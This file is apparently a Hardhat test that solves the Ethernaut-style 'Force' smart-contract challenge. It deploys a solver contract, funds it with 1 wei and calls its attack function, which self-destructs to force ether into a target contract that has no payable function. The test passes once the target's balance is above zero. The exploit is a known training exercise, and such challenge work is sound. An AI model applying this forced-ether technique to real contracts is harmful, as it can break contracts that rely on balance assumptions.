const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Force', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Force');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Force', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const ForceSolverFactory = await ethers.getContractFactory('ForceSolver', attacker);
        console.log(`\t deploying solver contract...`);
        const ForceSolver = await ForceSolverFactory.deploy();
        console.log(`\t sending 1 wei to solver contract...`);
        let sendTX = await attacker.sendTransaction({to:ForceSolver.address,value:1}); await sendTX.wait(); // Send 1 wei to the solver
        console.log(`\t attacking target by self-destruct...`);
        let attaclTX = await ForceSolver.connect(attacker).attack(this.target.address); await attaclTX.wait();
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(parseInt(await ethers.provider.getBalance(this.target.address))).to.be.gt(0);
    });
});